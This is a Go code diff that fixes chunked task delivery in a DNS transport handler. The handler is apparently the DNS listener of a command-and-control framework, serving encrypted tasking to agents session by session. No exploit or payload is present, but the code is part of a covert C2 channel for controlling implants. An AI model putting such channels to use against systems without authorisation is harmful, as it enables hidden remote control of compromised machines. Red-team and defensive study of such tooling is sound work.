@@ -439,43 +439,53 @@ func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
 
 	t.mu.Lock()
 	df, exists := t.downFrags[req.sid]
-	if exists && df != nil {
+	hasExisting := exists && df != nil
+	if hasExisting {
 		df.lastUpdate = time.Now()
-		if reqOffset <= df.total && reqOffset >= df.off {
-			maxChunk := uint32(dnsSafeChunkSize)
-			remaining := df.total - reqOffset
-			if remaining <= maxChunk {
-				df.off = df.total // Last chunk → mark complete
-			} else {
-				df.off = reqOffset + maxChunk
-			}
-		}
 	}
 	t.mu.Unlock()
 
-	// If no download in progress or download complete, fetch new tasks
-	if df == nil || df.off >= df.total {
-		if df != nil && df.off >= df.total {
-			t.mu.Lock()
-			delete(t.downFrags, req.sid)
-			t.mu.Unlock()
-			df = nil
+	// If an existing download is in progress AND the request is within its range,
+	// serve it (including the final chunk). Only after the final chunk is delivered
+	// will the NEXT request trigger deletion and new-task fetch.
+	if hasExisting && reqOffset < df.total {
+		chunk := t.buildResponseChunk(df, reqOffset)
+		// Track progress: if this was the last chunk, mark complete
+		t.mu.Lock()
+		maxChunk := uint32(dnsSafeChunkSize)
+		remaining := df.total - reqOffset
+		if remaining <= maxChunk {
+			df.off = df.total
+		} else if reqOffset+maxChunk > df.off {
+			df.off = reqOffset + maxChunk
 		}
+		t.mu.Unlock()
+		return chunk
+	}
 
-		taskData, err := ModuleObject.ts.TsAgentGetHostedAll(req.sid, int(maxDownloadSize))
-		if err == nil && len(taskData) > 0 {
-			uuid := make([]byte, 36)
-			copy(uuid, []byte(req.sid))
-			crypt := NewLokyCrypt(keyBytes, keyBytes)
-			encrypted := crypt.Encrypt(taskData)
-			wrapped := append(uuid, encrypted...)
+	// Existing download is complete (or doesn't exist): delete it and fetch new tasks
+	if hasExisting && df.off >= df.total {
+		t.mu.Lock()
+		delete(t.downFrags, req.sid)
+		t.mu.Unlock()
+		df = nil
+	}
 
-			nonce := newTaskNonce()
-			df = newDownBuf(wrapped, nonce)
-			t.mu.Lock()
-			t.downFrags[req.sid] = df
-			t.mu.Unlock()
-		}
+	taskData, err := ModuleObject.ts.TsAgentGetHostedAll(req.sid, int(maxDownloadSize))
+	if err == nil && len(taskData) > 0 {
+		uuid := make([]byte, 36)
+		copy(uuid, []byte(req.sid))
+		crypt := NewLokyCrypt(keyBytes, keyBytes)
+		encrypted := crypt.Encrypt(taskData)
+		wrapped := append(uuid, encrypted...)
+
+		nonce := newTaskNonce()
+		df = newDownBuf(wrapped, nonce)
+		t.mu.Lock()
+		t.downFrags[req.sid] = df
+		t.mu.Unlock()
+		// New download: agent should request from offset 0
+		return t.buildResponseChunk(df, 0)
 	}
 
 	return t.buildResponseChunk(df, reqOffset)
